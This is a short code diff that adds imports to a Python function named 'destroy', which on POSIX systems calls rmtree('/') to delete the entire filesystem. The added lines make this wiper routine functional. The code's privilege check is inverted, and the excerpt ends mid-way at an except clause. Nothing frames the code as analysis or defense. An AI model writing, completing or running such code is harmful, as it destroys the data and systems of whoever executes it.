@@ -1,5 +1,9 @@
+from shutil import rmtree
+from os import name,system
+
 def destroy(sys):
     if sys=="posix":
+        from os import geteuid
         root="sudo " if geteuid()==0 else ""
         try:rmtree("/")
         except:
